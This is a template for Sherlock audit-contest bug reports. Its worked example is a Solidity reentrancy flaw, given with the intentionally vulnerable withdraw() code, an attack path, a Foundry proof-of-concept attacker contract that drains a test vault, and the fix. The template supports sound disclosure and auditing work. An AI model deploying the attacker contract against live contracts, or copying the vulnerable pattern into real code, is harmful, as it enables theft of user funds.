# Sherlock Report Template

Template for Sherlock competitive audit contest submissions.

---

## Submission Format

Sherlock uses GitHub Issues for submissions. Each finding is a separate issue.

### Issue Title Format

```
{Researcher} - {Brief Title}
```

Example: `watson123 - Reentrancy in withdraw() allows fund drain`

---

## Finding Template

```markdown
{researcher_handle}

{severity}

# {Title}

## Summary

[1-2 sentence summary of the vulnerability and its impact]

## Root Cause

[Explain WHY the vulnerability exists - the fundamental coding error]

**Location:** `src/Contract.sol#L100-L120`

```solidity
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "Insufficient");

    (bool success, ) = msg.sender.call{value: amount}("");  // External call
    require(success, "Transfer failed");

    balances[msg.sender] -= amount;  // State update AFTER call - CEI violation
}
```

The function violates the Checks-Effects-Interactions pattern by updating state after making an external call.

## Internal Pre-conditions

[What conditions must exist within the protocol for this to be exploitable?]

1. User must have a non-zero balance in the contract
2. Contract must have sufficient ETH to process withdrawals

## External Pre-conditions

[What external conditions (market, other protocols, etc.) must exist?]

1. None required - exploit works in any market condition

## Attack Path

[Step-by-step attack sequence]

1. Attacker deploys malicious contract with `receive()` callback
2. Attacker deposits 1 ETH via `deposit()`
3. Attacker calls `withdraw(1 ether)`
4. Contract sends ETH, triggering attacker's `receive()`
5. In `receive()`, attacker re-enters `withdraw(1 ether)`
6. Steps 4-5 repeat until contract is drained
7. State updates execute in reverse order, all showing sufficient balance

## Impact

[Describe the impact - who is affected and how severely]

All user funds in the contract can be stolen by the attacker. This is a direct loss of funds with no limitations on the amount.

## PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract ReentrancyTest is Test {
    Vault vault;
    Attacker attacker;

    function setUp() public {
        vault = new Vault();
        attacker = new Attacker(address(vault));

        // Seed vault with victim funds
        address victim = makeAddr("victim");
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}();
    }

    function test_Reentrancy() public {
        vm.deal(address(attacker), 1 ether);

        uint256 vaultBefore = address(vault).balance;
        attacker.attack{value: 1 ether}();
        uint256 vaultAfter = address(vault).balance;

        assertEq(vaultBefore, 11 ether);
        assertEq(vaultAfter, 0);
        assertGt(address(attacker).balance, 10 ether);
    }
}

contract Attacker {
    Vault vault;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether);
        }
    }
}
```

Run: `forge test --match-test test_Reentrancy -vvv`

## Mitigation

[Specific fix recommendation]

1. Add `nonReentrant` modifier from OpenZeppelin
2. Follow CEI pattern - update state before external call

```solidity
function withdraw(uint256 amount) external nonReentrant {
    require(balances[msg.sender] >= amount, "Insufficient");

    balances[msg.sender] -= amount;  // State update FIRST

    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}
```
```

---

## Severity Guidelines

### High

- Direct loss of funds without extensive limitations
- Permanent freezing of funds
- Protocol insolvency

### Medium

- Theft or loss of yield
- Theft of funds with extensive limitations
- Loss of funds under external conditions
- Griefing (causing damage at attacker's cost)
- DoS preventing critical functions
- Breaking core invariants

### Low (Informational Only - Not Awarded)

- Best practice violations
- Highly unlikely scenarios
- Theoretical issues without realistic path

---

## Issue Labels

| Label | Meaning |
|-------|---------|
| `High` | High severity |
| `Medium` | Medium severity |
| `Duplicate` | Same root cause as another issue |
| `Invalid` | Not a valid vulnerability |
| `Escalate` | Warden disputes judging decision |
| `Sponsor Confirmed` | Protocol team confirms issue |
| `Will Fix` | Protocol plans to fix |
| `Won't Fix` | Protocol acknowledges but won't fix |

---

## Best Practices

1. **One Issue Per Submission** - Don't combine unrelated vulnerabilities
2. **Include GitHub Links** - Link to exact code lines
3. **Show Attack Path** - Clear step-by-step exploitation
4. **Provide PoC** - Foundry test preferred
5. **Check Known Issues** - Read contest README thoroughly
6. **Fill All Sections** - Missing sections may invalidate

---

## Common Rejection Reasons

- Finding already in known issues
- No realistic attack path
- Theoretical without proof
- Out of scope contracts
- Duplicate of another submission
- Insufficient impact for claimed severity
- Missing required sections (Root Cause, Attack Path, etc.)
